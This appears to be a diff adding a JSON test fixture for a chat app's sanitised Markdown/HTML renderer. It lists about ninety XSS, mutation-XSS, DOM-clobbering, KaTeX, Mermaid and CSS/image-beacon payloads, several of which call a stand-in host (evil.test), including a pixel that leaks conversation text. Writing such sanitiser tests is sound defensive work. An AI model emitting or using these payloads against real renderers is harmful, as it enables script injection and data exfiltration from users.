@@ -1,0 +1,576 @@
+{
+  "$comment": "Untrusted model output that the sanitised renderer must make inert. Rendered as an assistant answer, no payload may run script, make a network request, navigate, restyle the app or cause a Content-Security-Policy or Trusted Types violation. A payload that runs calls window.__aparteXss(id). `format` says whether it is Markdown or raw HTML (which Markdown passes through), and `threat` groups the payloads. Used by web/e2e/render.spec.ts.",
+  "hook": "__aparteXss",
+  "payloads": [
+    {
+      "id": "script-tag",
+      "format": "html",
+      "threat": "script",
+      "payload": "<script>__aparteXss('script-tag')</script>"
+    },
+    {
+      "id": "script-remote",
+      "format": "html",
+      "threat": "script",
+      "payload": "<script src=\"https://evil.test/x.js\"></script>"
+    },
+    {
+      "id": "script-uppercase",
+      "format": "html",
+      "threat": "script",
+      "payload": "<SCRIPT>__aparteXss('script-uppercase')</SCRIPT>"
+    },
+    {
+      "id": "script-inline-in-text",
+      "format": "markdown",
+      "threat": "script",
+      "payload": "Hello <script>__aparteXss('script-inline-in-text')</script> world, **bold** after."
+    },
+    {
+      "id": "svg-script",
+      "format": "html",
+      "threat": "script",
+      "payload": "<svg><script>__aparteXss('svg-script')</script></svg>"
+    },
+    {
+      "id": "template-script",
+      "format": "html",
+      "threat": "script",
+      "payload": "<template><script>__aparteXss('template-script')</script></template>"
+    },
+    {
+      "id": "img-onerror",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<img src=x onerror=\"__aparteXss('img-onerror')\">"
+    },
+    {
+      "id": "svg-onload",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<svg onload=\"__aparteXss('svg-onload')\"></svg>"
+    },
+    {
+      "id": "body-onload",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<body onload=\"__aparteXss('body-onload')\">"
+    },
+    {
+      "id": "details-ontoggle",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<details open ontoggle=\"__aparteXss('details-ontoggle')\"><summary>more</summary>text</details>"
+    },
+    {
+      "id": "input-autofocus",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<input autofocus onfocus=\"__aparteXss('input-autofocus')\">"
+    },
+    {
+      "id": "div-onmouseover",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<div onmouseover=\"__aparteXss('div-onmouseover')\">hover me</div>"
+    },
+    {
+      "id": "video-source-onerror",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<video><source onerror=\"__aparteXss('video-source-onerror')\"></video>"
+    },
+    {
+      "id": "marquee-onstart",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<marquee onstart=\"__aparteXss('marquee-onstart')\">x</marquee>"
+    },
+    {
+      "id": "svg-animate-onbegin",
+      "format": "html",
+      "threat": "handler",
+      "payload": "<svg><animate onbegin=\"__aparteXss('svg-animate-onbegin')\" attributeName=\"x\" dur=\"1s\"/></svg>"
+    },
+    {
+      "id": "multiline-attribute",
+      "format": "markdown",
+      "threat": "handler",
+      "payload": "<div\nonclick=\"__aparteXss('multiline-attribute')\">click</div>"
+    },
+    {
+      "id": "md-link-title-breakout",
+      "format": "markdown",
+      "threat": "handler",
+      "payload": "[x](https://example.org \"\\\" onmouseover=\\\"__aparteXss('md-link-title-breakout')\")"
+    },
+    {
+      "id": "iframe-srcdoc",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<iframe srcdoc=\"<script>parent.__aparteXss('iframe-srcdoc')</script>\"></iframe>"
+    },
+    {
+      "id": "iframe-javascript",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<iframe src=\"javascript:parent.__aparteXss('iframe-javascript')\"></iframe>"
+    },
+    {
+      "id": "iframe-data-html",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5wYXJlbnQuX19hcGFydGVYc3MoJ2lmcmFtZS1kYXRhLWh0bWwnKTwvc2NyaXB0Pg==\"></iframe>"
+    },
+    {
+      "id": "iframe-onload",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<iframe onload=\"__aparteXss('iframe-onload')\"></iframe>"
+    },
+    {
+      "id": "object-data-html",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<object data=\"data:text/html,<script>parent.__aparteXss('object-data-html')</script>\"></object>"
+    },
+    {
+      "id": "object-remote",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<object data=\"https://evil.test/object\"></object>"
+    },
+    {
+      "id": "embed-data-html",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<embed src=\"data:text/html,<script>parent.__aparteXss('embed-data-html')</script>\">"
+    },
+    {
+      "id": "frameset-javascript",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<frameset><frame src=\"javascript:parent.__aparteXss('frameset-javascript')\"></frameset>"
+    },
+    {
+      "id": "portal-remote",
+      "format": "html",
+      "threat": "frame",
+      "payload": "<portal src=\"https://evil.test/portal\"></portal>"
+    },
+    {
+      "id": "md-link-javascript",
+      "format": "markdown",
+      "threat": "link",
+      "payload": "[click me](javascript:__aparteXss('md-link-javascript'))"
+    },
+    {
+      "id": "md-link-javascript-case",
+      "format": "markdown",
+      "threat": "link",
+      "payload": "[click me](JaVaScRiPt:__aparteXss('md-link-javascript-case'))"
+    },
+    {
+      "id": "md-link-javascript-entity",
+      "format": "markdown",
+      "threat": "link",
+      "payload": "[click me](&#106;avascript:__aparteXss('md-link-javascript-entity'))"
+    },
+    {
+      "id": "md-link-javascript-tab",
+      "format": "markdown",
+      "threat": "link",
+      "payload": "[click me](java\tscript:__aparteXss('md-link-javascript-tab'))"
+    },
+    {
+      "id": "md-link-vbscript",
+      "format": "markdown",
+      "threat": "link",
+      "payload": "[click me](vbscript:msgbox(1))"
+    },
+    {
+      "id": "md-link-data-html",
+      "format": "markdown",
+      "threat": "link",
+      "payload": "[click me](data:text/html;base64,PHNjcmlwdD5fX2FwYXJ0ZVhzcygxKTwvc2NyaXB0Pg==)"
+    },
+    {
+      "id": "md-reference-link-javascript",
+      "format": "markdown",
+      "threat": "link",
+      "payload": "[click me][r]\n\n[r]: javascript:__aparteXss('md-reference-link-javascript')"
+    },
+    {
+      "id": "md-autolink-javascript",
+      "format": "markdown",
+      "threat": "link",
+      "payload": "<javascript:__aparteXss('md-autolink-javascript')>"
+    },
+    {
+      "id": "a-javascript",
+      "format": "html",
+      "threat": "link",
+      "payload": "<a href=\"javascript:__aparteXss('a-javascript')\">click me</a>"
+    },
+    {
+      "id": "a-javascript-spaces",
+      "format": "html",
+      "threat": "link",
+      "payload": "<a href=\" \t javascript:__aparteXss('a-javascript-spaces')\">click me</a>"
+    },
+    {
+      "id": "a-javascript-hex-entities",
+      "format": "html",
+      "threat": "link",
+      "payload": "<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:__aparteXss('a-javascript-hex-entities')\">click me</a>"
+    },
+    {
+      "id": "a-data-html",
+      "format": "html",
+      "threat": "link",
+      "payload": "<a href=\"data:text/html,<script>__aparteXss('a-data-html')</script>\">click me</a>"
+    },
+    {
+      "id": "a-ping",
+      "format": "html",
+      "threat": "link",
+      "payload": "<a href=\"https://example.org/\" ping=\"https://evil.test/ping\">a link with a ping</a>"
+    },
+    {
+      "id": "svg-xlink-javascript",
+      "format": "html",
+      "threat": "link",
+      "payload": "<svg><a xlink:href=\"javascript:__aparteXss('svg-xlink-javascript')\"><text y=\"20\">click</text></a></svg>"
+    },
+    {
+      "id": "svg-set-href",
+      "format": "html",
+      "threat": "link",
+      "payload": "<svg><a><set attributeName=\"href\" to=\"javascript:__aparteXss('svg-set-href')\"/><text y=\"20\">click</text></a></svg>"
+    },
+    {
+      "id": "svg-animate-values",
+      "format": "html",
+      "threat": "link",
+      "payload": "<svg><a><animate attributeName=\"href\" values=\"javascript:__aparteXss('svg-animate-values')\"/><text y=\"20\">click</text></a></svg>"
+    },
+    {
+      "id": "math-maction",
+      "format": "html",
+      "threat": "link",
+      "payload": "<math><maction actiontype=\"statusline\" xlink:href=\"javascript:__aparteXss('math-maction')\">x<mtext>y</mtext></maction></math>"
+    },
+    {
+      "id": "math-href",
+      "format": "html",
+      "threat": "link",
+      "payload": "<math href=\"javascript:__aparteXss('math-href')\"><mi>x</mi></math>"
+    },
+    {
+      "id": "form-action",
+      "format": "html",
+      "threat": "link",
+      "payload": "<form action=\"javascript:__aparteXss('form-action')\"><button>go</button></form>"
+    },
+    {
+      "id": "button-formaction",
+      "format": "html",
+      "threat": "link",
+      "payload": "<button formaction=\"javascript:__aparteXss('button-formaction')\">go</button>"
+    },
+    {
+      "id": "isindex-action",
+      "format": "html",
+      "threat": "link",
+      "payload": "<isindex action=\"javascript:__aparteXss('isindex-action')\" type=\"image\">"
+    },
+    {
+      "id": "md-image-remote",
+      "format": "markdown",
+      "threat": "image",
+      "payload": "![pixel](https://evil.test/pixel.png?q=the%20conversation)"
+    },
+    {
+      "id": "md-image-reference",
+      "format": "markdown",
+      "threat": "image",
+      "payload": "![pixel][img]\n\n[img]: https://evil.test/reference.png"
+    },
+    {
+      "id": "md-image-relative",
+      "format": "markdown",
+      "threat": "image",
+      "payload": "![pixel](pixel.png)"
+    },
+    {
+      "id": "md-image-protocol-relative",
+      "format": "markdown",
+      "threat": "image",
+      "payload": "![pixel](//evil.test/protocol-relative.png)"
+    },
+    {
+      "id": "md-image-entity-colon",
+      "format": "markdown",
+      "threat": "image",
+      "payload": "![pixel](https&#58;//evil.test/entity.png)"
+    },
+    {
+      "id": "md-image-in-link",
+      "format": "markdown",
+      "threat": "image",
+      "payload": "[![pixel](https://evil.test/nested.png)](https://example.org/)"
+    },
+    {
+      "id": "img-remote",
+      "format": "html",
+      "threat": "image",
+      "payload": "<img src=\"https://evil.test/img.png\" alt=\"pixel\">"
+    },
+    {
+      "id": "img-srcset",
+      "format": "html",
+      "threat": "image",
+      "payload": "<img srcset=\"https://evil.test/srcset.png 1x\" alt=\"pixel\">"
+    },
+    {
+      "id": "picture-source",
+      "format": "html",
+      "threat": "image",
+      "payload": "<picture><source srcset=\"https://evil.test/picture.png\"><img alt=\"pixel\"></picture>"
+    },
+    {
+      "id": "video-poster",
+      "format": "html",
+      "threat": "image",
+      "payload": "<video poster=\"https://evil.test/poster.png\"></video>"
+    },
+    {
+      "id": "audio-autoplay",
+      "format": "html",
+      "threat": "image",
+      "payload": "<audio src=\"https://evil.test/audio.mp3\" autoplay></audio>"
+    },
+    {
+      "id": "input-image",
+      "format": "html",
+      "threat": "image",
+      "payload": "<input type=\"image\" src=\"https://evil.test/input.png\" alt=\"go\">"
+    },
+    {
+      "id": "svg-image",
+      "format": "html",
+      "threat": "image",
+      "payload": "<svg><image href=\"https://evil.test/svg-image.png\" width=\"10\" height=\"10\"/></svg>"
+    },
+    {
+      "id": "svg-use",
+      "format": "html",
+      "threat": "image",
+      "payload": "<svg><use href=\"https://evil.test/sprite.svg#a\"/></svg>"
+    },
+    {
+      "id": "svg-feimage",
+      "format": "html",
+      "threat": "image",
+      "payload": "<svg><filter id=\"f\"><feImage href=\"https://evil.test/fe-image.png\"/></filter><rect filter=\"url(#f)\" width=\"9\" height=\"9\"/></svg>"
+    },
+    {
+      "id": "table-background",
+      "format": "html",
+      "threat": "image",
+      "payload": "<table background=\"https://evil.test/background.png\"><tr><td>cell</td></tr></table>"
+    },
+    {
+      "id": "link-prefetch",
+      "format": "html",
+      "threat": "image",
+      "payload": "<link rel=\"prefetch\" href=\"https://evil.test/prefetch\">"
+    },
+    {
+      "id": "link-dns-prefetch",
+      "format": "html",
+      "threat": "image",
+      "payload": "<link rel=\"dns-prefetch\" href=\"https://evil.test/\">"
+    },
+    {
+      "id": "style-attribute-url",
+      "format": "html",
+      "threat": "css",
+      "payload": "<div style=\"background-image:url(https://evil.test/style-attribute.png)\">styled</div>"
+    },
+    {
+      "id": "style-import",
+      "format": "html",
+      "threat": "css",
+      "payload": "<style>@import url(\"https://evil.test/import.css\");</style>"
+    },
+    {
+      "id": "style-background",
+      "format": "html",
+      "threat": "css",
+      "payload": "<style>body{background:url(https://evil.test/style-background.png)}</style>"
+    },
+    {
+      "id": "style-font-face",
+      "format": "html",
+      "threat": "css",
+      "payload": "<style>@font-face{font-family:x;src:url(https://evil.test/font.woff2)}p{font-family:x}</style>"
+    },
+    {
+      "id": "style-overlay",
+      "format": "html",
+      "threat": "css",
+      "payload": "<style>*{display:none!important}</style>"
+    },
+    {
+      "id": "link-stylesheet",
+      "format": "html",
+      "threat": "css",
+      "payload": "<link rel=\"stylesheet\" href=\"https://evil.test/stylesheet.css\">"
+    },
+    {
+      "id": "svg-style-import",
+      "format": "html",
+      "threat": "css",
+      "payload": "<svg><style>@import \"https://evil.test/svg-style.css\";</style></svg>"
+    },
+    {
+      "id": "meta-refresh",
+      "format": "html",
+      "threat": "navigation",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.test/refresh\">"
+    },
+    {
+      "id": "meta-refresh-javascript",
+      "format": "html",
+      "threat": "navigation",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:__aparteXss('meta-refresh-javascript')\">"
+    },
+    {
+      "id": "base-href",
+      "format": "markdown",
+      "threat": "navigation",
+      "payload": "<base href=\"https://evil.test/\">\n\n[a relative link](page) and ![pixel](relative.png)"
+    },
+    {
+      "id": "mxss-noscript",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<noscript><p title=\"</noscript><img src=x onerror=__aparteXss('mxss-noscript')>\"></noscript>"
+    },
+    {
+      "id": "mxss-svg-style",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<svg><style><img src=x onerror=__aparteXss('mxss-svg-style')></style></svg>"
+    },
+    {
+      "id": "mxss-math-mglyph",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<math><mtext><table><mglyph><style><img src=x onerror=__aparteXss('mxss-math-mglyph')>"
+    },
+    {
+      "id": "mxss-form-math",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=__aparteXss('mxss-form-math') src>\">"
+    },
+    {
+      "id": "mxss-comment",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<!--><img src=x onerror=__aparteXss('mxss-comment')>-->"
+    },
+    {
+      "id": "mxss-cdata",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<svg><![CDATA[><img src=x onerror=__aparteXss('mxss-cdata')>]]></svg>"
+    },
+    {
+      "id": "mxss-title",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<title><img src=x onerror=__aparteXss('mxss-title')></title>"
+    },
+    {
+      "id": "mxss-xmp",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<xmp><img src=x onerror=__aparteXss('mxss-xmp')></xmp>"
+    },
+    {
+      "id": "mxss-textarea",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<textarea></textarea><img src=x onerror=__aparteXss('mxss-textarea')>"
+    },
+    {
+      "id": "svg-foreign-object",
+      "format": "html",
+      "threat": "mxss",
+      "payload": "<svg><foreignObject><img src=x onerror=__aparteXss('svg-foreign-object')></foreignObject></svg>"
+    },
+    {
+      "id": "clobber-document",
+      "format": "html",
+      "threat": "clobbering",
+      "payload": "<img name=\"createElement\"><form name=\"cookie\"></form><img name=\"body\">"
+    },
+    {
+      "id": "clobber-window",
+      "format": "html",
+      "threat": "clobbering",
+      "payload": "<a id=\"trustedTypes\"></a><a id=\"trustedTypes\" name=\"createPolicy\"></a><iframe name=\"crypto\"></iframe>"
+    },
+    {
+      "id": "katex-href",
+      "format": "markdown",
+      "threat": "math",
+      "payload": "$\\href{javascript:__aparteXss('katex-href')}{x}$"
+    },
+    {
+      "id": "katex-url",
+      "format": "markdown",
+      "threat": "math",
+      "payload": "$$\\url{javascript:__aparteXss('katex-url')}$$"
+    },
+    {
+      "id": "katex-includegraphics",
+      "format": "markdown",
+      "threat": "math",
+      "payload": "$\\includegraphics{https://evil.test/katex.png}$"
+    },
+    {
+      "id": "katex-html-data",
+      "format": "markdown",
+      "threat": "math",
+      "payload": "$\\htmlData{onload=__aparteXss('katex-html-data')}{x}$"
+    },
+    {
+      "id": "code-fence-html",
+      "format": "markdown",
+      "threat": "code",
+      "payload": "```html\n<script>__aparteXss('code-fence-html')</script>\n<img src=x onerror=__aparteXss('code-fence-html-img')>\n```"
+    },
+    {
+      "id": "code-fence-language-breakout",
+      "format": "markdown",
+      "threat": "code",
+      "payload": "```\"><img src=x onerror=__aparteXss('code-fence-language-breakout')>\nplain\n```"
+    },
+    {
+      "id": "inline-code",
+      "format": "markdown",
+      "threat": "code",
+      "payload": "`<img src=x onerror=__aparteXss('inline-code')>`"
+    },
+    {
+      "id": "mermaid-fence",
+      "format": "markdown",
+      "threat": "code",
+      "payload": "```mermaid\ngraph TD; A-->B; click A callback \"__aparteXss\"\n```"
+    }
+  ]
+}
